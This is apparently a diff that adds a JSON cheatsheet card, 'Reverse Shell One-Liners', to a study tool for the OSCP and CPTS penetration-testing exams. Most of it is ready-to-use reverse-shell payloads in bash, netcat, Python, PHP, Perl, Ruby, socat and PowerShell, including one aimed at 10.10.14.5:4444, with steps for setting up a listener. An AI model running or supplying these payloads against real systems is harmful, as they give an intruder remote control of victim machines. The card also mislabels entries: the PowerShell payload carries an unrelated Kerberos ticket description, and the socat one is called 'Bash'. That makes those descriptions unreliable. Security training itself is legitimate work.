@@ -1,0 +1,114 @@
+{
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "bash",
+    "nc",
+    "python",
+    "php",
+    "socat",
+    "powershell"
+  ],
+  "tags": [
+    "reverse-shell",
+    "payload",
+    "foothold",
+    "cheatsheet"
+  ],
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Shared - Cross-Module Reference",
+  "examples": [
+    "nc -lvnp 4444   # listener",
+    "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
+  ],
+  "notes": "Set up the listener before firing: nc -lvnp <lport>. The socat and python3 variants give a fully interactive PTY. On Windows targets prefer the PowerShell one-liner or a msfvenom binary. Upgrade a dumb shell with the tty-shell-upgrade card.",
+  "references": [
+    {
+      "title": "PayloadsAllTheThings - Reverse Shell Cheat Sheet",
+      "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
+    },
+    {
+      "title": "revshells.com",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "tty-shell-upgrade",
+      "note": "Stabilize the dumb shell into an interactive PTY."
+    }
+  ],
+  "id": "reverse-shell-oneliners",
+  "name": "Reverse Shell One-Liners",
+  "type": "cheatsheet",
+  "command": "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1",
+  "description": "Collection of reverse shell one-liners across common interpreters. Set up a listener first (nc -lvnp <lport>), then trigger the payload that matches whatever is installed on the target. Switch tabs for bash, nc, python, php, perl, ruby, socat and PowerShell variants.",
+  "category": "Exploitation",
+  "subcategory": "Reverse Shells",
+  "variations": [
+    {
+      "label": "Bash (fd 196)",
+      "command": "0<&196;exec 196<>/dev/tcp/<lhost>/<lport>; sh <&196 >&196 2>&196",
+      "description": "Bash reverse shell using file descriptor 196 for the TCP connection. Alternative to the /dev/tcp method that works on some systems where the standard bash reverse shell fails."
+    },
+    {
+      "label": "nc mkfifo",
+      "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> <lport> >/tmp/f",
+      "description": "Netcat reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
+    },
+    {
+      "label": "nc -e",
+      "command": "nc -e /bin/sh <lhost> <lport>",
+      "description": "Netcat reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
+    },
+    {
+      "label": "Python3",
+      "command": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<lhost>\",<lport>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
+      "description": "Python reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
+    },
+    {
+      "label": "PHP",
+      "command": "php -r '$s=fsockopen(\"<lhost>\",<lport>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "description": "PHP reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
+    },
+    {
+      "label": "Perl",
+      "command": "perl -e 'use Socket;$i=\"<lhost>\";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "description": "Perl reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
+    },
+    {
+      "label": "Ruby",
+      "command": "ruby -rsocket -e'f=TCPSocket.open(\"<lhost>\",<lport>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+      "description": "Ruby reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
+    },
+    {
+      "label": "socat",
+      "command": "socat TCP:<lhost>:<lport> EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
+      "description": "Bash reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
+    },
+    {
+      "label": "PowerShell",
+      "command": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<lhost>',<lport>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}\"",
+      "description": "Uses Impacket getST to request a Kerberos Service Ticket (TGS) for a specific SPN. Used in constrained delegation attacks, S4U abuse, and service ticket manipulation."
+    }
+  ],
+  "opsec": "loud",
+  "exam": "exam-ok",
+  "mitre": [
+    "T1059.004"
+  ],
+  "explain": "Collection of reverse shell one-liners across common interpreters.\nSet up a listener first (nc -lvnp <lport>), then trigger the payload that matches whatever is installed on the target.\nSet up the listener before firing: nc -lvnp <lport>."
+}
